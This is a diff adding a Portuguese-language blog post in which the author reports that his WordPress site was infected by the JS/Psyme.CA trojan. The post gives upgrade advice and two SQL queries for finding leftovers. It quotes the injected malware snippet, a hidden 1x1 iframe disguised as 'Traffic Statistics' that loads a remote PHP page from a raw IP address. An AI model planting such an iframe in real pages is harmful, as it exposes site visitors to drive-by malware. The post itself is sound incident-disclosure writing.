@@ -1,0 +1,24 @@
+--- 
+wordpress_id: 914
+title: "\xC3\x89 macumba?"
+wordpress_url: http://www.tiagoluchini.eu/?p=914
+layout: post
+---
+Não bastassem os problemas com o e-mail que estou enfrentando, ganhei outro de presente! Acaso você esteja com dificuldades para acessar o site não se preocupe: você não está sozinho!
+
+O blog foi contaminado pelo trojan JS/Psyme.CA através de uma vulnerabilidade de seguranca do WordPress. Em linguagem humana isso quer dizer que alguém me sacaneou porque outro alguém deixou a porta aberta.
+
+A principal característica desse trojan é espalhar o código abaixo por todas as suas páginas:
+<pre><span>&lt;!-- Traffic Statistics --&gt;</span></pre>
+<pre><span>&lt;iframe src=http://61.132.75.71/iframe/wp-stats.php width=1 height=1 frameborder=0&gt;&lt;/iframe&gt;</span></pre>
+<pre>&lt;!-- End Traffic Statistics --&gt;</pre>
+Além disso ele aparentemente altera o código dos seus plugins.
+
+O problema afeta todas as versões do WordPress até a 2.3.3 (sim, mesmo as assim recentes).
+
+Para resolver o problema terá que realizar uma atualizacão para o WordPress 2.5 (pelo menos) e ainda procurar rastros do trojan no seu conteúdo. Haja trabalho!
+
+Duas instrucões SQL podem ajudar na aventura:
+<pre>SELECT * FROM `PREFIX_comments` WHERE `comment_content` LIKE ‘%&lt;iframe%;</pre>
+<pre>SELECT * FROM `PREFIX_posts` WHERE `post_title` LIKE ‘%&lt;iframe%’;</pre>
+Lembre-se de trocar PREFIX pelo prefixo utilizado pelo seu WordPress.
